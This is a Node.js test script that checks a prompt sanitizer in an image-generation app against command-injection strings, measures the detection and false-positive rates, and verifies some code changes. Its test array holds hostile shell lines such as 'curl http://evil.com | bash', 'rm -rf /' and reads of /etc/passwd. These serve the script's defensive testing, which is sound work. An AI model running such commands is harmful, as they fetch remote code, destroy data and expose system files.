#!/usr/bin/env node

/**
 * Security test script to verify command injection protection
 * 
 * This script tests the security fixes by sending potentially malicious prompts
 * and verifying that no shell commands are executed.
 */

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

// Malicious prompts that should be detected and logged
const INJECTION_TEST_PROMPTS = [
    // Command substitution
    'Create an image of $(whoami)',
    'Show me `cat /etc/passwd`',
    'Draw echo $((8742391+5765284))',

    // Command chaining
    'A sunset; ls -la',
    'A cat && rm -rf /',
    'A dog || curl evil.com',

    // Variable expansion
    'Show ${HOME} directory',
    'Display $PATH variable',

    // Shell commands
    '/bin/sh -c "echo hacked"',
    'bash -c "whoami"',

    // File operations
    'Read > /tmp/test.txt',
    'Write < /etc/passwd',

    // Dangerous keywords
    'sudo rm -rf /',
    'chmod 777 /etc',
    'curl http://evil.com | bash',
    'wget http://evil.com/malware.sh',
    'python -c "import os; os.system(\'ls\')"',
];

// Safe prompts that should work normally
const SAFE_PROMPTS = [
    'A beautiful sunset over mountains',
    'A cute cat playing with yarn',
    'A futuristic cityscape',
    'An abstract painting with colors',
];

async function testPromptSanitization() {
    console.log('🧪 Testing Prompt Sanitization\n');

    // Import the sanitizer (this would normally be done in the API routes)
    const { sanitizePrompt } = await import('../src/lib/promptSanitizer.ts');

    console.log('Testing malicious prompts:');
    let detectedCount = 0;
    for (const prompt of INJECTION_TEST_PROMPTS) {
        const result = sanitizePrompt(prompt);
        if (!result.safe) {
            detectedCount++;
            console.log(`  ✅ DETECTED: "${prompt.substring(0, 50)}..."`);
            console.log(`     Warnings: ${result.warnings.join(', ')}`);
        } else {
            console.log(`  ❌ MISSED: "${prompt.substring(0, 50)}..."`);
        }
    }

    console.log(`\n📊 Detection Rate: ${detectedCount}/${INJECTION_TEST_PROMPTS.length} (${((detectedCount / INJECTION_TEST_PROMPTS.length) * 100).toFixed(1)}%)\n`);

    console.log('Testing safe prompts:');
    let falsePositives = 0;
    for (const prompt of SAFE_PROMPTS) {
        const result = sanitizePrompt(prompt);
        if (result.safe) {
            console.log(`  ✅ ALLOWED: "${prompt}"`);
        } else {
            falsePositives++;
            console.log(`  ⚠️  FALSE POSITIVE: "${prompt}"`);
            console.log(`     Warnings: ${result.warnings.join(', ')}`);
        }
    }

    console.log(`\n📊 False Positive Rate: ${falsePositives}/${SAFE_PROMPTS.length} (${((falsePositives / SAFE_PROMPTS.length) * 100).toFixed(1)}%)\n`);

    if (detectedCount === INJECTION_TEST_PROMPTS.length && falsePositives === 0) {
        console.log('✅ All tests passed! Sanitization is working correctly.\n');
        return true;
    } else {
        console.log('⚠️  Some tests failed. Review the sanitization logic.\n');
        return false;
    }
}

async function testAPIEndpoint(endpoint, prompt, cookies) {
    try {
        const response = await fetch(`${BASE_URL}${endpoint}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cookie': cookies || '',
            },
            body: JSON.stringify({ prompt }),
        });

        return {
            status: response.status,
            ok: response.ok,
            data: await response.json().catch(() => ({})),
        };
    } catch (error) {
        return {
            status: 0,
            ok: false,
            error: error.message,
        };
    }
}

async function runTests() {
    console.log('🔒 Security Test Suite\n');
    console.log('='.repeat(60));
    console.log('\n');

    // Test 1: Prompt Sanitization
    const sanitizationPassed = await testPromptSanitization();

    console.log('='.repeat(60));
    console.log('\n');

    // Test 2: Check for modalities parameter removal
    console.log('🔍 Verifying Code Changes\n');

    const fs = await import('fs/promises');

    const imageQueueContent = await fs.readFile('./src/lib/imageQueue.ts', 'utf-8');
    const messagesRouteContent = await fs.readFile('./src/app/api/chat/threads/[threadId]/messages/route.ts', 'utf-8');

    // Check that modalities are commented out (not active)
    const imageQueueSafe = imageQueueContent.includes('// modalities:') || !imageQueueContent.includes('modalities: [\'image\', \'text\']');
    const messagesRouteSafe = messagesRouteContent.includes('// modality:') || !messagesRouteContent.includes('modality: \'text\'');
    console.log(`  ${imageQueueSafe ? '✅' : '❌'} imageQueue.ts: Dangerous modalities ${imageQueueSafe ? 'removed' : 'still present'}`);
    console.log(`  ${messagesRouteSafe ? '✅' : '❌'} messages/route.ts: Dangerous modalities ${messagesRouteSafe ? 'removed/commented' : 'still present'}`);

    const sanitizerExists = await fs.access('./src/lib/promptSanitizer.ts').then(() => true).catch(() => false);
    console.log(`  ${sanitizerExists ? '✅' : '❌'} promptSanitizer.ts: ${sanitizerExists ? 'Created' : 'Missing'}`);

    console.log('\n');
    console.log('='.repeat(60));
    console.log('\n');

    // Summary
    console.log('📋 Test Summary\n');
    const allPassed = sanitizationPassed && imageQueueSafe && messagesRouteSafe && sanitizerExists;

    if (allPassed) {
        console.log('✅ All security tests passed!');
        console.log('\n✨ Your application is now protected against command injection attacks.\n');
        console.log('Next steps:');
        console.log('  1. Deploy these changes to your server');
        console.log('  2. Monitor server logs for security warnings');
        console.log('  3. Check your server security panel - alerts should stop\n');
    } else {
        console.log('⚠️  Some tests failed. Please review the implementation.\n');
    }

    process.exit(allPassed ? 0 : 1);
}

// Run tests
runTests().catch(error => {
    console.error('❌ Test suite failed:', error);
    process.exit(1);
});
